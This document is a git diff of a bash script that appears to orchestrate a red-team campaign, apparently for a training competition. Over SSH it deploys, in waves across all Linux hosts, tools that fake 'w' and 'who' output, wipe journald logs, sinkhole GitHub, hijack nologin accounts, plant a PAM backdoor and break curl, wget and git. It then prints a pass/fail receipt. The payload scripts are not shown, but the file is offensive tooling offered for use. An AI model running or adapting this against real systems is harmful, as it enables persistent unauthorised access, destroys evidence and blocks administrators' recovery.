@@ -26,8 +26,6 @@
 set -euo pipefail
 
 RT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-REPO_DIR="$(dirname "$RT_DIR")"
-REPO_URL="git@github.com:scp603/cdtrt2.git"
 MASS="${RT_DIR}/mass-deploy.sh"
 
 GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
@@ -38,11 +36,11 @@ err()  { echo -e "${RED}[!]${NC} $*" >&2; }
 hdr()  { echo -e "\n${CYAN}${BOLD}━━  $*  ━━${NC}\n"; }
 
 # ── defaults ──────────────────────────────────────────────────────────────────
-SSH_USER="root"
+SSH_USER=""
 SSH_KEY=""
 SSH_PASS=""
 SSH_PORT="22"
-NO_SUDO=1      # default on: if you're SSHing as root you don't need sudo
+NO_SUDO=0      # default off: use sudo unless --no-sudo passed or user is root
 MAX_JOBS=9
 DRY_RUN=0
 EXTRA_OPTS=()
@@ -66,6 +64,19 @@ while [[ $# -gt 0 ]]; do
     esac
 done
 
+# ── prompt for user if not provided ──────────────────────────────────────────
+if [[ -z "$SSH_USER" ]]; then
+    read -rp $'\033[0;36m[?]\033[0m SSH user for all targets [root]: ' SSH_USER
+    SSH_USER="${SSH_USER:-root}"
+fi
+info "SSH user: ${SSH_USER}"
+
+# ── prompt for password if not provided ──────────────────────────────────────
+if [[ -z "$SSH_PASS" && -z "$SSH_KEY" ]]; then
+    read -rsp $'\033[0;36m[?]\033[0m SSH password (also used as sudo password): ' SSH_PASS
+    echo
+fi
+
 # build shared mass-deploy auth flags
 [[ -n "$SSH_KEY"  ]] && EXTRA_OPTS+=(-i "$SSH_KEY")
 [[ -n "$SSH_PASS" ]] && EXTRA_OPTS+=(-p "$SSH_PASS")
@@ -75,6 +86,75 @@ done
 
 md() {
     "$MASS" -u "$SSH_USER" -j "$MAX_JOBS" "${EXTRA_OPTS[@]}" "$@"
+}
+
+# ── receipt tracking ──────────────────────────────────────────────────────────
+RECEIPT_LABELS=()
+RECEIPT_PASSED=()
+RECEIPT_FAILED=()
+RECEIPT_TOTAL=()
+RECEIPT_REASONS=()
+
+wave() {
+    local label="$1"; shift
+    RECEIPT_LABELS+=("$label")
+    local tmpfile
+    tmpfile=$(mktemp)
+    local rc=0
+    md "$@" 2>&1 | tee "$tmpfile" || rc=${PIPESTATUS[0]}
+
+    # parse "Done: X passed, Y failed (of N hosts)" from mass-deploy output
+    local summary_line
+    summary_line=$(grep -oE "[0-9]+ passed, [0-9]+ failed \(of [0-9]+ hosts\)" "$tmpfile" 2>/dev/null | tail -1)
+    local passed=0 failed=0 total=0
+    if [[ -n "$summary_line" ]]; then
+        passed=$(echo "$summary_line" | grep -oE "^[0-9]+")
+        failed=$(echo "$summary_line" | grep -oE "^[0-9]+" <<< "${summary_line#* passed, }")
+        total=$(echo  "$summary_line" | grep -oE "\(of ([0-9]+)" | grep -oE "[0-9]+")
+    fi
+    RECEIPT_PASSED+=("$passed")
+    RECEIPT_FAILED+=("$failed")
+    RECEIPT_TOTAL+=("$total")
+
+    # extract unique error reasons (only for hosts that actually failed with a real error)
+    local reason
+    reason=$(grep -oE "(Permission denied|No route to host|Connection refused|Connection timed out|Host key verification failed|No such file or directory)" \
+                 "$tmpfile" 2>/dev/null \
+             | sort -u | head -3 | tr '\n' '  ' | sed 's/[[:space:]]*$//')
+    RECEIPT_REASONS+=("$reason")
+    rm -f "$tmpfile"
+}
+
+print_receipt() {
+    echo
+    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${BOLD}${CYAN}  RECEIPT${NC}"
+    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    local all_ok=0 some_ok=0 none_ok=0
+    for i in "${!RECEIPT_LABELS[@]}"; do
+        local label="${RECEIPT_LABELS[$i]}"
+        local passed="${RECEIPT_PASSED[$i]}"
+        local failed="${RECEIPT_FAILED[$i]}"
+        local total="${RECEIPT_TOTAL[$i]}"
+        local reason="${RECEIPT_REASONS[$i]}"
+        local score="${passed}/${total}"
+        if [[ "$passed" -eq "$total" && "$total" -gt 0 ]]; then
+            echo -e "  ${GREEN}[OK  ${score}]${NC}  ${BOLD}${label}${NC}"
+            (( all_ok++ )) || true
+        elif [[ "$passed" -gt 0 ]]; then
+            echo -e "  ${YELLOW}[PART ${score}]${NC} ${BOLD}${label}${NC}"
+            [[ -n "$reason" ]] && echo -e "            ${YELLOW}${reason}${NC}"
+            (( some_ok++ )) || true
+        else
+            echo -e "  ${RED}[FAIL ${score}]${NC} ${BOLD}${label}${NC}"
+            [[ -n "$reason" ]] && echo -e "            ${YELLOW}${reason}${NC}"
+            (( none_ok++ )) || true
+        fi
+    done
+    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "  ${GREEN}${all_ok} full${NC}   ${YELLOW}${some_ok} partial${NC}   ${RED}${none_ok} failed${NC}"
+    echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo
 }
 
 # ── banner ────────────────────────────────────────────────────────────────────
@@ -101,42 +181,37 @@ cat << 'EOF'
 EOF
 echo -e "${NC}"
 
-# ── step 1: pull latest tooling ───────────────────────────────────────────────
-hdr "Step 1/5 — Pulling latest tooling"
-
-if [[ -d "$REPO_DIR/.git" ]]; then
-    info "Repo exists at ${REPO_DIR} — pulling latest"
-    git -C "$REPO_DIR" pull --ff-only
-else
-    info "Cloning ${REPO_URL} → ${REPO_DIR}"
-    git clone "$REPO_URL" "$REPO_DIR"
-fi
-
-chmod +x "${RT_DIR}"/*.sh "${RT_DIR}"/evil-timer/*.sh \
-         "${RT_DIR}"/pam-backdoor/*.sh "${RT_DIR}"/persist/*.sh \
-         "${RT_DIR}"/webshells/*.sh 2>/dev/null || true
-
-# ── step 2: compromise w + who ────────────────────────────────────────────────
-hdr "Step 2/5 — Faking w + who"
+# ── step 1: compromise w + who ────────────────────────────────────────────────
+hdr "Step 1/6 — Faking w + who"
 info "Deploying compromise-who to all Linux hosts…"
-md compromise-who install
+wave "compromise-who" compromise-who install
+
+# ── step 2: nuke journal ──────────────────────────────────────────────────────
+hdr "Step 2/6 — Nuking journald"
+info "Deploying nuke-journal to all Linux hosts…"
+wave "nuke-journal   " nuke-journal install
 
 # ── step 3: github sinkhole ───────────────────────────────────────────────────
-hdr "Step 3/5 — GitHub dnsmasq sinkhole"
-info "Deploying sinkhole (dnsmasq, fast) to all Linux hosts…"
-md sinkhole install
+hdr "Step 3/6 — GitHub dnsmasq sinkhole"
+info "Deploying sinkhole to all Linux hosts…"
+wave "sinkhole       " sinkhole install
 
-# ── step 4: PAM backdoor ─────────────────────────────────────────────────────
-hdr "Step 4/5 — PAM backdoor"
+# ── step 4: infinite users ────────────────────────────────────────────────────
+hdr "Step 4/6 — Hijacking nologin accounts"
+info "Deploying infinite-users to all Linux hosts…"
+wave "infinite-users " infinite-users install
+
+# ── step 5: PAM backdoor ──────────────────────────────────────────────────────
+hdr "Step 5/6 — PAM backdoor"
 info "Deploying pam-backdoor to all Linux hosts…"
-md pam-backdoor install
+wave "pam-backdoor   " pam-backdoor install
 
-# ── step 5: break net tools ───────────────────────────────────────────────────
-hdr "Step 5/5 — Breaking curl, wget, git"
+# ── step 6: break net tools ───────────────────────────────────────────────────
+hdr "Step 6/6 — Breaking curl, wget, git"
 info "Deploying break-net-tools to all Linux hosts…"
-md break-net-tools install
+wave "break-net-tools" break-net-tools install
 
-# ── done ──────────────────────────────────────────────────────────────────────
-echo
-echo -e "${GREEN}${BOLD}  All waves complete. Madness achieved.${NC}"
+# ── receipt ───────────────────────────────────────────────────────────────────
+print_receipt
+echo -e "${GREEN}${BOLD}  Madness achieved.${NC}"
 echo
